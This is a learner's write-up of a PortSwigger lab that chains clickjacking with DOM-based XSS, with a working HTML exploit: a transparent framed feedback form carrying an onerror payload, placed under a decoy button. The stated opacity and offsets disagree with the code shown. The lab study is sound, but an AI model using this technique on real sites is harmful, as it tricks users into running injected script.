# PortSwigger Web Security Academy: Clickjacking Lab 4

## Lab Name
Exploiting clickjacking vulnerability to trigger DOM-based XSS

## How I Solved

1. **Identified Vector:** Noticed the `/feedback` form pre-fills parameters from the URL and is vulnerable to DOM-based XSS via the `name` parameter.
2. **Crafted Payload:** Used the Exploit Server to host an HTML payload with an invisible `iframe` containing the XSS vector to call the `print()` function.
3. **UI Redressing (Alignment):**
   * Added a decoy `<div>Click me</div>` element.
   * Adjusted CSS absolute positioning (`top: 610px` and `left: 80px`) to place the decoy text precisely on top of the hidden "Submit feedback" button.
4. **Made Transparent:** Hidden the iframe completely by changing the `opacity` to `0.0001`.
5. Final Code Used:
```html
<style>
    iframe {
        position: relative;
        width: 1100px;
        height: 500px;
        opacity: 0.1; 
        z-index: 2;
    }
    div {
        position: absolute;
        top: 418px; 
        left: 80px; 
        z-index: 1;
    }
</style>
<div>Click me</div>
<iframe
src="https://0a9400fd031f32d5803a039400d50049.web-security-academy.net/feedback?name=<img src=1 onerror=print()>&email=hacker@attacker-website.com&subject=test&message=test#feedbackResult"></iframe>
```
6. **Executed Attack:** Stored and delivered the exploit to the victim, forcing them to submit the form and execute the XSS.

## What I Learned 

* **Vulnerability Chaining:** "Self-XSS" (an XSS that only affects the person typing it) usually carries low severity. However, by chaining it with Clickjacking, an attacker can turn it into a high-severity exploit that targets other users.
* **Exploitation:** The target site's feedback form is vulnerable to both DOM-based XSS via URL parameters and Clickjacking. By pre-filling the parameter with an XSS payload (`<img src=1 onerror=print()>`) inside a hidden iframe, the attacker forces the victim to trigger the XSS execution with a single click.
* **Defense:** Implement robust HTTP security headers like `Content-Security-Policy (CSP) frame-ancestors` and ensure strict input sanitization/context-aware output encoding to prevent DOM-based XSS.

